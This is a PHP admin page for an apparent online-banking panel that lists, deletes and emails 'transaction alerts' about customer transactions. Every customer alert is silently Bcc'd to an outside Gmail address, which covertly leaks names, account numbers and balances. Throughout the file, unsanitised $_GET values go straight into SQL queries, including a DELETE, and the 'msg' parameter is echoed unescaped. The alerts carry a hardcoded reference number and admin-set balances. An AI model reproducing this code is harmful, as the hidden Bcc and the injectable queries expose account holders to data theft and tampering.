<?php
session_start();
require('../things/sources/conn_auth.php');
require('../things/sources/customInfo.php');
require('../things/sources/config.php');
require('../things/sources/ipb.php');
if(isset($_GET['action'])){
$delT = $conn->query("delete from credit_info where transact_id = '" . $_GET['id'] . "'") or die($conn->error);
header("location:view_transact_info.php?msg=Transaction has been successfully removed&acct_nmb=". $_GET['acct_nmb']);
}

?>


<?php
 $sql = $conn->query("UPDATE credit_info
SET credit_info.email=(SELECT customer_info.email
  FROM customer_info
  WHERE customer_info.acct_nmb=credit_info.accnt_nmb)") or die($conn->error); 
?>





<?php
if(isset($_GET['action1'])){

    $selAmt = $conn->query("select * from credit_info where transact_id = '" . $_GET['id'] . "'") or die(mysql_error());
$rowAmt = $selAmt->fetch_assoc();
    
    
    
    
    //CURRENCE
$selcuuu = $conn->query("select * from curr_type where accnt_nmb = '" . $rowAmt['accnt_nmb'] . "'") or die(mysql_error());
$rowCrrr = $selcuuu->fetch_assoc();
$currr = $rowCrrr['curr_type']; 
    
    
    
    // TOTAL BALANCE
   $selBank = $conn->query("select *, sum(amt_cred) as totalCredit, sum(amt_dep) as totalDebit from credit_info where accnt_nmb = '" . $rowAmt['accnt_nmb'] . "' group by accnt_nmb") or die($conn->error);
     $rowBank = $selBank->fetch_assoc(); 
   $total = number_format($rowBank['totalCredit']-$rowBank['totalDebit'], 2, '.', ',');
    
    

// SHOW CREDIT OR DEBIT ON EMAIL
if( $rowAmt['trans_type']=="Credit"){
   $trans_head = "Credited"; 
    
 $amt_credit = $rowAmt['amt_cred'];    
  $amt_debit = '';
    
}else{  
    $trans_head = "Debited";
    $amt_debit = $rowAmt['amt_dep'];
    $amt_credit = ''; 
    }
    
    
   
    
    


 
// To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
$headers = "From:'Alert....  $site_name'<alert@$domain>\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$trans_id = substr(time()*rand(), 0, 14);
// Create email headers
    
    
    
$to = $rowAmt['email'];
$subject = "Transaction Alert [ $trans_head:  $amt_credit $amt_debit $currr] ";
$headers .= "Bcc: aturosandaval@gmail.com \r\n";



        
        
        // Admin email hearders
$subject2 = "SENT TRANSACTION RECEIPT";
$headers2 = "From:'Transfer Fom  $site_name'<transfer@$domain>\n";
$headers2 .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
 

// Compose a simple HTML email message
$message2 = '<html><body>';
$message2 .= '<div><span style="color:#003399; font-size:16px; font-weight:600;">TRANSACTION ID: </span>'. $trans_id .' </div>';
$message2 .= '<p style="color:#080;font-size:14px; font-family:Helvetica; padding;9px; margin:10px 0px 10px 0px;">Hello Admin the following receipt was sent</p>';
$message2 .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
$message2 .= '<p style="color:#003399;font-size:18px;">Beneficiary Name:<span style="color:#990000; font-size:16px; font-weight:200;"> ' . $rowAmt['payee_name'] . '</span> 
<br>Customer name: <span style="color:#990000; font-size:16px; font-weight:200;">'. $rowAmt['cust_name'] . '</span>
<br>Customer Account Number: <span style="color:#990000; font-size:16px; font-weight:200;">'. $rowAmt['accnt_nmb'] . '</span>
<br>Narative: <span style="color:#990000; font-size:16px; font-weight:200;"> '. $rowAmt['payee_name'] . '/'. $rowAmt['narratn'] . '</span>
<br>Amount: <span style="color:#990000; font-size:16px; font-weight:200;"> '. $amt_credit . '  ' . $amt_debit . '  ' .$rowCrrr['curr_type']. '</span>
<br>Sender Name: <span style="color:#990000; font-size:16px; font-weight:200;">'. $rowAmt['payee_name'] . '</span>
<br>Sender account number: <span style="color:#990000; font-size:16px; font-weight:200;">'. $rowAmt['payee_accnt'] . '</span>
<br>Transaction Time: <span style="color:#990000; font-size:16px; font-weight:200;">'. $rowAmt['dat_pay'] . '</span>

<br>Recept Sending Time Date:  <span style="color:#990000; font-size:16px; font-weight:200;"> '.$adddate.'</span> </p>';
$message2 .='</div>';
$message2 .= '<div style="padding:9px;">';
$message2 .= '<p style="color:#000066; font-size:14px; font-weight:400"></p>';
$message2 .= '</div>';
$message2 .= '</body></html>';
    
    
    
    
 // customer message 
$message = '<html><body>';
$message .= '<div >';
$message .='<div class="">
<div style="padding: 9px;">
<p>&nbsp;</p>
<table style="height: 917px; background-color: #e4f2ec; width: 641px;" border="0" width="675" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 700px;">
<td style="height: 631px; width: 655px;" valign="top" bgcolor="#FEFEFE">
<table style="height: 204px;" border="0" width="650" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 192px;">
<td style="height: 192px; width: 646px;" valign="top"><img class="v1CToWUd v1a6T" src="'.$site_url.'/things/img/alert-pics.jpg" alt="Never Share With Anyone Your Information" width="640" height="346" border="0" /></td>
</tr>
<tr style="height: 12px;">
<td style="height: 12px; width: 646px;">&nbsp;</td>
</tr>
</tbody>
</table>
<table style="height: 622px; width: 639px;" border="0" width="590" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 522px;">
<td style="height: 443px; width: 635px;" valign="top">
<h2 style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">&nbsp;</h2>
<h2 style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Dear '. $rowAmt['cust_name'] . ',</h2>
<center>
<h3 style="font-size: 16px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Your account has been '.$trans_head.'</h3>
<h1 style="font-size: 30px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;"><span style="font-size: 30px; font-family: inherit; vertical-align: baseline; font-weight: 600; margin: 0px; line-height: 30px; font-stretch: inherit; border: 0px; padding: 0px;"> '. $amt_credit . ' ' . $amt_debit . ' ' .$rowCrrr['curr_type'].' </span></h1>
</center>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;This is the transaction that has occurred on your account.</p>
<table style="width: 651px;" border="0" cellspacing="3" cellpadding="3">
<tbody>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7"><strong>AC/Number:</strong></td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">'. $rowAmt['accnt_nmb'] . '</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7">Account Name:</td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">'. $rowAmt['cust_name'] . '</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7"><strong><span>Description</span>:</strong></td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $rowAmt['payee_name'] . ' / '. $rowAmt['narratn'] . '</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7">Reference Number:</td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">&nbsp;9766557643457</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7">Transaction Branch:</td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">&nbsp;HEAD OFFICE</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7">Transaction Date:</td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $rowAmt['dat_pay'] . '</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#D7CAF7">Value Date:</td>
<td style="width: 422px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $rowAmt['dat_pay'] . '</td>
</tr>
<tr>
<td style="width: 202px;" bgcolor="#5E2785"><strong>Available Balance:</strong></td>
<td style="width: 422px;" align="left" bgcolor="#5E2785"><strong>' .$rowCrrr[curr_type]. ' '.$total.'</strong></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>Important Security and Privacy Information</strong><br />Your <em><span>'.$site_name.'</span></em> user ID and password, security answers, card numbers and PIN are private and should never be disclosed to anyone.</p>
</td>
</tr>
<tr style="height: 179px;">
<td style="font-size: 15px; width: 635px; height: 179px;"><center>
<h3 style="font-size: 16px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Kindly click to rate your experience with This Bank</h3>
<div style="overflow: auto; max-width: 680px; vertical-align: baseline; margin: 0px auto; border: 0px; padding: 0px;">
<table style="max-width: 450px; width: 450px; height: 76px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height: 76px;">
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 137px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-94339-49" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/Good.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Good</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 137px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-307610-50" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/skeptical.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Fair</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 138px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-717384-51" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/Bad.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Bad</p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
</center></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style="height: 91px;">
<td style="height: 77px; width: 655px;" valign="top">
<p><img src="'.$site_url.'/things/img/mandatory.png" width="650" height="51" /></p>
</td>
</tr>
<tr style="height: 74px;">
<td style="height: 70px; width: 655px;" valign="top">
<table style="height: 47px; width: 100%;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height: 47px;">
<td style="height: 47px;" valign="top" width="10%">&nbsp;</td>
<td style="height: 47px;" valign="top" width="30%"><a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/fb_purple.png" width="52" height="52" border="0" /></a><a href="https://twitter.com" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/twt_purple.png" width="52" height="52" border="0" /></a><a href="http://www.linkedin.com/" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/LkdIn_purple.png" width="52" height="52" border="0" /></a><img src="'.$site_url.'/things/img/Ig_purple.png" width="52" height="52" /><a href="https://wa.me/'.$admin_whatsapp.'" target="_blank" ><img src="'.$site_url.'/things/img/Whatsapp_purple.png" width="52" height="52" /></a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style="height: 139px;">
<td style="height: 139px; width: 655px;" valign="top">
<table style="width: 635px;" border="0" width="650" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="width: 631px;" valign="top" bgcolor="#FFFFFF"><span style="color: #9297a3;">If you have reason to suspect any unauthorised activity on your account<br />please contact us by sending an email to '.$admin_email.'</span><br /><br /><span style="color: #9297a3;"><span>For more information on our products and services, please call our 24/7<br />contact centre on '.$admin_phone.'</span></span>&nbsp;<span style="color: #9297a3;"><span>or chat with us via</span></span><br /><span style="color: #5c068c;"><span>Whatsapp on '.$admin_phone.'</span></span>&nbsp;<span style="color: #efefef;"><br /></span><span style="color: #9297a3;">Alternatively send an email to</span> <span style="color: #9297a3;">'.$admin_email.'</span><br /><br />Copyright &copy; 2021. '.$site_name.'</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
</div>';
$message.='</div>';
$message .= '<div style="padding:9px;">';
$message .= '</div>';
$message .= '</body></html>';  
  
    
    
 
// Sending email
    {   
    mail($admin_email,$subject2,$message2,$headers2);
    }
if(mail($to,$subject,$message,$headers)){
   
header("location:view_transact_info.php?msg=Transaction alert has been sent successfully&acct_nmb=". $_GET['acct_nmb']);

}
}
?>






<?php include 'header.php'; ?>
  <!-- Left side column. contains the logo and sidebar -->
<?php include 'sidebar.php'; ?>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Dashboard
        <small>Control panel</small>
      </h1>
      <ol class="breadcrumb">
        <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">Dashboard</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">
      <!-- Small boxes (Stat box) -->
      <!-- /.row -->
      <!-- Main row -->
<div class="row">
        <!-- Left col -->
        <section class="col-lg-12 connectedSortable">
          <!-- Custom tabs (Charts with tabs)-->
          <div class="nav-tabs-custom">
            <!-- Tabs within a box -->
            <ul class="nav nav-tabs pull-right">
              <li class="active"><a href="#revenue-chart" data-toggle="tab">Area</a></li>
              <li><a href="#sales-chart" data-toggle="tab">Donut</a></li>
                
                
                <?php 
                
                $selCuInfo = $conn->query("select * from customer_info where acct_nmb = '" . $_GET['acct_nmb'] . "'") or die($conn->error);
                $rowCuInfo = $selCuInfo->fetch_array()
                ?>
                
              <li class="pull-left header"><i class="fa fa-inbox"></i> Registered User <?php echo $rowCuInfo['cust_name']; ?></li>
            </ul>
              
              
              
              
              <?php
                 //CURRENCE
$selC = $conn->query("select * from curr_type where accnt_nmb = '" . $_GET['acct_nmb'] . "'") or die(mysql_error());
$rowC = $selC->fetch_assoc();
$myC = $rowC['curr_type']; 
              
    // TOTAL BALANCE
   $selT = $conn->query("select *, sum(amt_cred) as totalCredit, sum(amt_dep) as totalDebit from credit_info where accnt_nmb = '" . $_GET['acct_nmb'] . "' group by accnt_nmb") or die($conn->error);
     $rowT = $selT->fetch_assoc(); 
   $myT = number_format($rowT['totalCredit']-$rowT['totalDebit'], 2, '.', ',');
             
            ?>   
              
              <div ><strong style="color: red;">Available balance: </strong><span><?php echo $myC; ?> <?php echo $myT; ?> </span></div>
              
              
               <div>
               <button class="btn btn-warning-off" style="background-color: orange; color: white;" class="pull-right"><div align="right" class="pull-right" ><a href="view_user_attempt_transact.php?acct_nmb=<?php echo $_GET['acct_nmb']; ?>">View Pending Transactions</a></div></button>
                 </div>
                
                  <button class="btn btn-warning-off" class="pull-right"><div align="right" class="pull-right" ><a href="view_edit_trans_user.php?acct_nmb=<?php echo $_GET['acct_nmb']; ?>">Edit This User Transactions</a></div></button>
                
              
               <button  class="pull-right"><div align="right" class="pull-right" ><a href="more_info.php?id=<?php echo $rowCuInfo['customer_id']; ?>">Back To User Info =></a></div></button>
              
            <div class="tab-content no-padding">
             <div style="margin:20px 0px 0px 10px;" class="RadGrid RadGrid_MetroTouch table-responsive">    
                          <?php
						  if(isset($_GET['msg'])){
						  echo "<div class='alert alert-info'>" . $_GET['msg']. "</div>";
						  }
						  ?>
                          <table width="100%" align="center" cellpadding="3" cellspacing="1" bgcolor="#013694">
                  <tr>
                  <th height="34" bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    
                      No
                  </div></th>
                  <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    Payee/Recipient Name
                  </div></th>
                  <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    Customer Name
                  </div></th>
                  <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    Account Number
                  </div></th>
                   <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                     Transaction
                      </div></th>
                   <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                     Credit
                   </div></th>
                   <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    Debit
                     </div></th>
                  <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                    Date                 
                     </div></th>
                     <th bgcolor="#007EB6"><div align="left" class="style2 style1 style12">
                   &nbsp;                 
                     </div></th>
                   </tr>
                  <?php
				  $i=0;
				  $seLInfo = $conn->query("select * from credit_info where accnt_nmb = '" . $_GET['acct_nmb'] . "' ORDER BY dat_pay DESC") or die($conn->error);
                  if(!$seLInfo->num_rows){
				  ?>
                  <tr>
                  <td height="37" colspan="8" bgcolor="#FFFFFF">This customer have not made any transaction. </td>
                  </tr>
                  <?php
				  }else{
                  
				  while($rowInfo = $seLInfo->fetch_array()){
				  $i++;
				  ?>
				  <tr style="border-bottom:1px solid #666666;">
                  <td height="29" bgcolor="#FFFFFF"><div align="left"><?php echo $i; ?></div></td>
                  <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['payee_name']; ?></div></td>
                   <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['cust_name']; ?></div></td> 
                   <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['accnt_nmb']; ?></div></td> 
					 <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['trans_type']; ?></div></td> 
					 <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['amt_cred']; ?></div></td> 
                     <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['amt_dep']; ?></div></td> 
                     <td bgcolor="#FFFFFF"><div align="left"><?php echo $rowInfo['dat_pay']; ?></div></td> 
                      <td bgcolor="#FFFFFF"><div align="left"><a href="view_transact_info.php?id=<?php echo $rowInfo['transact_id']; ?>&action=Delete transaction&acct_nmb=<?php echo $rowInfo['accnt_nmb']; ?>" onclick="clickedTrans(event)" >Delete</a></div></td>
                      
                      
                      <td bgcolor="#FFFFFF"><div align="left"><a href="view_transact_info.php?id=<?php echo $rowInfo['transact_id']; ?>&action1=SELECT transaction&acct_nmb=<?php echo $rowInfo['accnt_nmb']; ?>">SEND ALERT</a></div></td>
                    </tr>
                    
					<?php
					}
					}
					?>	
                    </table>          
            </div>
                
                
                
                <script>
function clickedTrans(e)
{
    if(!confirm('Are you sure? Deleteing will erease this transaction for this user')) {
        e.preventDefault();
    }
}
</script>
              
              <!-- Morris chart - Sales -->
              <div class="chart tab-pane active" id="revenue-chart" style="position: relative; height: 300px;"></div>
              <div class="chart tab-pane" id="sales-chart" style="position: relative; height: 300px;"></div>
            
            
            </div>
          </div>
          <!-- /.nav-tabs-custom -->

          <!-- Chat box -->
          <!-- /.box (chat box) -->
          <!-- TO DO List -->
          <!-- /.box -->
          <!-- quick email widget -->
        </section>
        <!-- /.Left col -->
        <!-- right col (We are only adding the ID to make the widgets sortable)-->
        <section class="col-lg-5 connectedSortable">

          <!-- Map box -->
          <div class="box box-solid bg-light-blue-gradient">
            <div class="box-header">
              <!-- tools box -->
              <div class="pull-right box-tools">
                <button type="button" class="btn btn-primary btn-sm daterange pull-right" data-toggle="tooltip"
                        title="Date range">
                  <i class="fa fa-calendar"></i></button>
                <button type="button" class="btn btn-primary btn-sm pull-right" data-widget="collapse"
                        data-toggle="tooltip" title="Collapse" style="margin-right: 5px;">
                  <i class="fa fa-minus"></i></button>
              </div>
              <!-- /. tools -->

              <i class="fa fa-map-marker"></i>

              <h3 class="box-title">
                Visitors
              </h3>
            </div>
            <div class="box-body">
              <div id="world-map" style="height: 250px; width: 100%;"></div>
            </div>
            <!-- /.box-body-->
            <div class="box-footer no-border">
              <div class="row">
                <div class="col-xs-4 text-center" style="border-right: 1px solid #f4f4f4">
                  <div id="sparkline-1"></div>
                  <div class="knob-label">Visitors</div>
                </div>
                <!-- ./col -->
                <div class="col-xs-4 text-center" style="border-right: 1px solid #f4f4f4">
                  <div id="sparkline-2"></div>
                  <div class="knob-label">Online</div>
                </div>
                <!-- ./col -->
                <div class="col-xs-4 text-center">
                  <div id="sparkline-3"></div>
                  <div class="knob-label">Exists</div>
                </div>
                <!-- ./col -->
              </div>
              <!-- /.row -->
            </div>
          </div>
          <!-- /.box -->

          <!-- solid sales graph -->
          <!-- /.box -->
          <!-- Calendar -->
          <!-- /.box -->
        </section>
        <!-- right col -->
      </div>
      <!-- /.row (main row) -->

    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
<footer class="main-footer">
    <div class="pull-right hidden-xs">
      <b>Version</b> 2.4.0
    </div>
    <strong>Copyright &copy; <?php echo date('Y'); ?> <a href="https://adminlte.io"><?php echo $site_name ; ?></a>.</strong> All rights
    reserved.
  </footer>

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
      <li><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-gears"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Recent Activity</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-birthday-cake bg-red"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Langdon's Birthday</h4>

                <p>Will be 23 on April 24th</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-yellow"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Frodo Updated His Profile</h4>

                <p>New phone +1(800)555-1234</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Nora Joined Mailing List</h4>

                <p>nora@example.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-file-code-o bg-green"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Cron Job 254 Executed</h4>

                <p>Execution time 5 seconds</p>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

        <h3 class="control-sidebar-heading">Tasks Progress</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Custom Template Design
                <span class="label label-danger pull-right">70%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-danger" style="width: 70%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Update Resume
                <span class="label label-success pull-right">95%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-success" style="width: 95%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Laravel Integration
                <span class="label label-warning pull-right">50%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-warning" style="width: 50%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Back End Framework
                <span class="label label-primary pull-right">68%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-primary" style="width: 68%"></div>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

      </div>
      <!-- /.tab-pane -->
      <!-- Stats tab content -->
      <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
        <form method="post">
          <h3 class="control-sidebar-heading">General Settings</h3>

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Report panel usage
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Some information about this general settings option
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Allow mail redirect
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Other sets of options are available
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Expose author name in posts
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Allow the user to show his name in blog posts
            </p>
          </div>
          <!-- /.form-group -->

          <h3 class="control-sidebar-heading">Chat Settings</h3>

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Show me as online
              <input type="checkbox" class="pull-right" checked>
            </label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Turn off notifications
              <input type="checkbox" class="pull-right">
            </label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Delete chat history
              <a href="javascript:void(0)" class="text-red pull-right"><i class="fa fa-trash-o"></i></a>
            </label>
          </div>
          <!-- /.form-group -->
        </form>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  <!-- Add the sidebar's background. This div must be placed
       immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
</div>
<!-- ./wrapper -->

<!-- jQuery 3.1.1 -->
<script src="plugins/jQuery/jquery-3.1.1.min.js"></script>
<!-- jQuery UI 1.11.4 -->
<script src="https://code.jquery.com/ui/1.11.4/jquery-ui.min.js"></script>
<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
<script>
  $.widget.bridge('uibutton', $.ui.button);
</script>
<!-- Bootstrap 3.3.7 -->
<script src="bootstrap/js/bootstrap.min.js"></script>
<!-- Morris.js charts -->

<script src="plugins/morris/morris.min.js"></script>
<!-- Sparkline -->
<script src="plugins/sparkline/jquery.sparkline.min.js"></script>
<!-- jvectormap -->
<script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
<script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
<!-- jQuery Knob Chart -->
<script src="plugins/knob/jquery.knob.js"></script>
<!-- daterangepicker -->
<script src="plugins/daterangepicker/daterangepicker.js"></script>
<!-- datepicker -->
<script src="plugins/datepicker/bootstrap-datepicker.js"></script>
<!-- Bootstrap WYSIHTML5 -->
<script src="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
<!-- Slimscroll -->
<script src="plugins/slimScroll/jquery.slimscroll.min.js"></script>
<!-- FastClick -->
<script src="plugins/fastclick/fastclick.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
<script src="dist/js/pages/dashboard.js"></script>
<!-- AdminLTE for demo purposes -->
<script src="dist/js/demo.js"></script>
</body>
</html>
